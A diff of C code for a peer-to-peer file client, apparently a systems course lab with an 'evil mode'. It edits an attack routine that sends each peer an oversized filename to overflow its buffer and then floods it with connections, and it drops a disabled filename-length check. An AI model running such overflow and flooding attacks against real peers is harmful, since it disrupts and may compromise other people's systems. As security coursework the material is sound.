@@ -527,13 +527,6 @@ static void task_download(task_t *t, task_t *tracker_task)
 	assert((!t || t->type == TASK_DOWNLOAD)
 	       && tracker_task->type == TASK_TRACKER);
 	
-	// check for the filename size
-	//if (FILENAMESIZ <  strlen(t->filename)) 
-	//{
-	//	error("* Error: filename is too large.\n");
-	//	goto exit;
-	//}
-	
 	// Quit if no peers, and skip this peer
 	if (!t || !t->peer_list) {
 		error("* No peers are willing to serve '%s'\n",
@@ -774,35 +767,39 @@ void download_attack(task_t *tracker_task)
 {
 	task_t *t = start_download(tracker_task, NULL);
 
-	if (t == NULL)
-	{
-		error("* Error: Can't get list of prey - now trying upload attack");
+	if (t == NULL){
+		error("* Error: Can't proceed with download attack.");
 		return;
 	}
 
 	
-	while (t->peer_list != NULL)
-	{
+	while (t->peer_list != NULL){
 		pid_t pid;
 		int num_attacks = 0;
 
 		if (t->peer_list->addr.s_addr == listen_addr.s_addr && t->peer_list->port == listen_port)
 			continue;
 
-		if ((pid = fork()) < 0)
-		{
+		if ((pid = fork()) < 0){
 			error("* Can't fork to attack");
 			task_free(t);
 			return;
 		}
 
-		if (pid > 0)
-		{
+		if (pid > 0){
 			task_pop_peer(t);
 			continue;
 		}
 		
-		// Try a peer overrun attack
+		// First attempt a buffer overflow on the filename
+		message("* Try attacking with filename buffer overflow\n");
+		// create buffer overflow input
+		char overflow[FILENAMESIZ * 3];
+		memset(overflow, 1, FILENAMESIZ*3);
+		// send input
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", overflow);	
+
+		//Next try a peer overrun attack
 		message("* Try attacking %s:%d with '%s' peer denial of service\n", 
 		inet_ntoa(t->peer_list->addr), 
 		t->peer_list->port, t->filename);
@@ -810,7 +807,7 @@ void download_attack(task_t *tracker_task)
 		t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
 		if (t->peer_fd == -1) {
 			error("* Error: can't connect to peer: %s\n", strerror(errno));
-			//goto try_again;
+			goto end;
 		}
 		// attack repeatedly
 		while (1) {
@@ -818,24 +815,16 @@ void download_attack(task_t *tracker_task)
 			if (t->peer_fd == -1) {
 				error("* Successful peer overrun - user can no longer connect to peer any more: %s\n"
 					, strerror(errno));
-				//goto try_again;
 			}
 		}
 
-		// Attempt a buffer overflow
-		message("* Try attacking with filename buffer overflow\n");
-		// create buffer overflow input
-		char overflow[FILENAMESIZ * 3];
-		memset(overflow, 1, FILENAMESIZ*3);
-
-		// send input
-		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", overflow);	
-
-		close(t->peer_fd);
-			
-		message("* Tried attacking %s:%d\n", inet_ntoa(t->peer_list->addr), t->peer_list->port);
-		exit(0);
+		end: 
+			close(t->peer_fd);
+			//All attacks on the peer done
+			message("* Tried attacking %s:%d\n", inet_ntoa(t->peer_list->addr), t->peer_list->port);
+			exit(0);
 	}
+	task_free(t);
 }
 
 
@@ -927,7 +916,7 @@ int main(int argc, char *argv[])
 	
 	// First, download files named on command line.
 	//Exercise 1 - Parallel Downloads
-	for (; argc > 1; argc--, argv++){
+	for (; argc > 1 && !evil_mode; argc--, argv++){
 		if ((t = start_download(tracker_task, argv[1]))){
 			pid_t child;
 			child = fork();
